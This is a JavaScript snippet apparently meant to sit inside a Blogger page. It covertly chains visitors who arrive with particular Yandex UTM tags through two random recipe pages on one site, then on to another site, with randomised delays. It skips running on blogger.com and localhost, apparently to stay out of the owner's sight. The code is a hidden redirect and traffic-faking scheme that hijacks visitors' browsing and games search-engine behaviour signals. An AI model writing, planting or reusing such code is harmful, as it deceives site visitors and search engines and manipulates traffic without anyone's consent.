//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
    "https://www.domashniyrestoran.ru/2023/05/thai-coconut-curry-soup-with-shrimp-and.html",
	"https://www.domashniyrestoran.ru/2023/05/baked-parmesan-crusted-chicken-with.html",
	"https://www.domashniyrestoran.ru/2023/05/roasted-beet-and-goat-cheese-salad-with.html",
	"https://www.domashniyrestoran.ru/2023/05/lemon-herb-grilled-salmon-with-quinoa.html",
	"https://www.domashniyrestoran.ru/2023/05/creamy-garlic-butter-tuscan-shrimp-pasta.html",
	"https://www.domashniyrestoran.ru/2023/05/bbq-jackfruit-sandwiches-with-tangy.html",
	"https://www.domashniyrestoran.ru/2023/05/mediterranean-stuffed-bell-peppers-with.html",
	"https://www.domashniyrestoran.ru/2023/05/caramelized-onion-and-gruyere-cheese.html",
	"https://www.domashniyrestoran.ru/2023/05/blueberry-lemon-ricotta-pancakes-with.html",
    "https://www.domashniyrestoran.ru/2023/05/mexican-street-corn-salad-with-lime.html"
    ];

    const externalLinks = [
    "https://www.gotovimrusskoe.ru/2024/08/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_27.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_79.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_24.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_95.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_68.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_46.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.gotovimrusskoe.ru/2024/08/blog-post_77.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.gotovimrusskoe.ru/2024/08/blog-post_90.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

